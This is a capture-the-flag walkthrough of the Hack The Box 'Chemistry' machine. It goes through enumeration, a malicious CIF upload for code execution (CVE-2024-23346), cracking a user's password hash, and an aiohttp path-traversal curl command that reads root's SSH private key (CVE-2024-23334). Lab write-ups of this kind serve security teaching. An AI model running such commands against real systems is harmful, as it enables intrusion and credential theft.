## Hack The Box -- Chemistry (10.129.50.228)


### Enumeration

- First I'll start off with a fast nmap scan to get a list of open ports to do a more Agressive scan against. This fast nmap scan shows us just ports 22, and 5000 open.

	> $ nmap -p- <TARGET IP> -vv --open -T5


![nmap](/Chemistry/images/nmap-fast.png) 



- Next I'll do a more aggressive scan against ports 22 and 5000. 

	> $ nmap -p 22,5000 10.129.50.228 -A -sCV -T4 -Pn -oN nmap/nmap-all-tcp.nmap
	


![nmap](/Chemistry/images/nmap-aggressive.png) 


- After a more thorough scan it appears port 5000 is running a python / werkzeug web Server. Server: Werkzeug/3.0.3 Python/3.9.5. 



	Nmap scan report for 10.129.50.228
	Host is up (0.071s latency).
	
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
	|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
	|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
	5000/tcp open  upnp?
	| fingerprint-strings: 
	|   GetRequest: 
	|     HTTP/1.1 200 OK
	|     Server: Werkzeug/3.0.3 Python/3.9.5
	|     Date: Sat, 26 Oct 2024 13:24:00 GMT
	|     Content-Type: text/html; charset=utf-8
	|     Content-Length: 719
	|     Vary: Cookie
	|     Connection: close
	|     <!DOCTYPE html>
	|     <html lang="en">
	|     <head>
	|     <meta charset="UTF-8">
	|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
	|     <title>Chemistry - Home</title>
	|     <link rel="stylesheet" href="/static/styles.css">
	|     </head>
	|     <body>
	|     <div class="container">
	|     class="title">Chemistry CIF Analyzer</h1>
	|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
	|     <div class="buttons">
	|     <center><a href="/login" class="btn">Login</a>
	|     href="/register" class="btn">Register</a></center>
	|     </div>
	|     </div>
	|     </body>
	|   RTSPRequest: 
	|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
	|     "http://www.w3.org/TR/html4/strict.dtd">
	|     <html>
	|     <head>
	|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	|     <title>Error response</title>
	|     </head>
	|     <body>
	|     <h1>Error response</h1>
	|     <p>Error code: 400</p>
	|     <p>Message: Bad request version ('RTSP/1.0').</p>
	|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
	|     </body>
	|_    </html>
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port5000-TCP:V=7.94SVN%I=7%D=10/26%Time=671CED6F%P=aarch64-unknown-linu
	SF:x-gnu%r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3
	SF:\.0\.3\x20Python/3\.9\.5\r\nDate:\x20Sat,\x2026\x20Oct\x202024\x2013:24
	SF::00\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
	SF:ength:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTY
	SF:PE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20ch
	SF:arset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content
	SF:=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title
	SF:>Chemistry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesh
	SF:eet\"\x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x
	SF:20\n\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x2
	SF:0class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"t
	SF:itle\">Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\
	SF:x20<p>Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x2
	SF:0tool\x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographi
	SF:c\x20Information\x20File\)\x20and\x20analyze\x20the\x20structural\x20da
	SF:ta\x20contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x
	SF:20class=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<
	SF:center><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x
	SF:20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"b
	SF:tn\">Register</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x2
	SF:0\x20\x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\
	SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20
	SF:\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20
	SF:\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv
	SF:=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20
	SF:\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20<
	SF:/head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Err
	SF:or\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\
	SF:x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20reque
	SF:st\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
	SF:0<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Ba
	SF:d\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x
	SF:20\x20</body>\n</html>\n");
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
	No exact OS matches for host (test conditions non-ideal).
	Uptime guess: 43.929 days (since Thu Sep 12 10:07:10 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=261 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE (using port 22/tcp)
	HOP RTT      ADDRESS
	1   78.93 ms 10.10.14.1
	2   80.86 ms 10.129.50.228


- Navigating to the webpage on port 5000 we see it's name is Chemistry CIF Analyzer. It says we can upload a CIF (Crystallographic Information File) and the page will analyze the stuctural data contained within. 


![web](/Chemistry/images/webpage.png) 


- I'll run a quick feroxbuster scan to see if I can find any hidden directories. It doesn't return much just the following. 

1. /login
2. /logout => /login?next=%2Flogout
3. /register
4. /static/style.css
5. /
6. /upload
7. /dashboard => login?next=%2Fdashboard


![web](/Chemistry/images/feroxbuster.png) 


- Theres an option to login or register for an account on the homepage. I'll register for an account and see if it will let me login. After I register an account it redirects me to a dashboard page where I can upload a CIF file or there is an option to download an example cif file at /static/example.cif. I click on the download example because I'm not familiar with CIF files.


![web](/Chemistry/images/register.png) 



![web](/Chemistry/images/dashboard.png) 



- Analyzing the CIF file a little exiftool just reconizes it at a txt file with a MIME encoding of us-ascii. Running the file command against it and it returns as ASCII text. But catting out the file it is in a special formatting. I'm going to rename the example.cif file and try to upload it to the server. 


![cif](/Chemistry/images/cif-file.png) 


- I upload the file to the webserver and if shows the following output which pretty much lines up with the information when I catted out the file. I think with exiftool or something I could embed some PHP data in the CIF file but I don't know how it would get processed by the server. 


![web](/Chemistry/images/upload.png) 


- I did some googling about CIF file vulnerabilities and exploits. I came accross a GitHub page for [CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) which is a critical .cif arbitrary code execution when you create a specially crafted CIF file. 


- I took the template from the expamle.cif file that I was able to download from the server and added in the exploit code. My malicious CIF file looks like the following with the malicious code added in. I'll also need to start a netcat listener on my attack machine to catch the shell before uploading the malicious cif file. 


### Foothold

- After uploading the malicious cif file just click on view and we get a shell as user app. 


![shell](/Chemistry/images/foothold.png) 


- Looking around app's home directory it has the app.py file which is the python code that is running on port 5000. It also has a password in the file. It looks like it's for sqlite db files but there's also another user on this box called rosa. We could see if it works for her ssh password as well.

	app@chemistry:~$ cat app.py                                                                                    
	from flask import Flask, render_template, request, redirect, url_for, flash
	from werkzeug.utils import secure_filename                                                                     
	from flask_sqlalchemy import SQLAlchemy                
	from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user         
	from pymatgen.io.cif import CifParser                                                                          
	import hashlib                                         
	import os                                              
	import uuid                                            
		                                                  
	app = Flask(__name__)                                  
	app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'                                                              
	app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'                                                
	app.config['UPLOAD_FOLDER'] = 'uploads/'
	app.config['ALLOWED_EXTENSIONS'] = {'cif'}                                                                     
		                                                  
	db = SQLAlchemy(app)                                   
	login_manager = LoginManager(app)                                                                              
	login_manager.login_view = 'login'


### Privilege Escalation


- The password doesn't word for Rosa but if we look around a bit more in /home/app/instance there's a database.db file. If we transfer it to our host and look through all the user's in it it also has a list of hashes associated with them. Lets see if we can crack Rosa's or admin's hash.


![enum](/Chemistry/images/database.png) 


- The admin hash won't crack but rosa's hash does and this is what we get for the password: unicorniosrosados. Let's see if we can ssh in as Rosa now. 

![hashes](/Chemistry/images/hashes.png) 


- The password works to ssh in as Rosa. Checking sudo perms Rosa isn't allowed to run sudo on chemistry. Also checking netstat we can see that chemistry is listening on proxy port 8080. 


![netstat](/Chemistry/images/proxy.png) 


- Let's local portforward 8080 to our attack machine since we have Rosa's ssh login and see if it's running anything interesting. I forgot about burp suite also running on 8080 and if we port forward 8080 and try to nmap it it's just detecting burp. Let's change it to 8000 on our attack box so it won't confuse it with burp suite.

	> $ ssh rosa@10.129.50.228 -L 8000:127.0.0.1:8080 


![burp](/Chemistry/images/burp.png) 


- If we do a whatweb scan against port 8000 on our localhost we can see that the target is running Python 3.9 aiohttp 3.9.1 Web Server.


![whatweb](/Chemistry/images/whatweb.png) 


- Googling around for exploits and vulnerabilities associated with aiohttp I found this [github page and CVE](https://github.com/wizarddos/CVE-2024-23334). It looks like all the links for the Server software remain static and we can use if to exploit LFI to get sensitive files on the server. So we should be able to do something like the following to grab the root SSH private key.

	> $ curl -s --path-as-is http://localhost:8000/assets/../../../../root/.ssh/id_rsa | tee id_rsa


- The above command works and piping it with tee we now have the private key saved as id_rsa file on our attacker machine. So now that we have root's private ssh key we should be able to ssh into Chemistry as root.


![root](/Chemistry/images/curl.png) 


- I works we are able to SSH in as the root user and grab the root.txt flag and pwn Chemistry. This was a fun box. The foothold was arbitrary code execution related to CVE-2024-23346 and for root privleges we could exploit the LFI / Path Traversal associated with Aiohttp =< 3.9.1 CVE-2024-23334. 


![pwned](/Chemistry/images/pwned.png) 
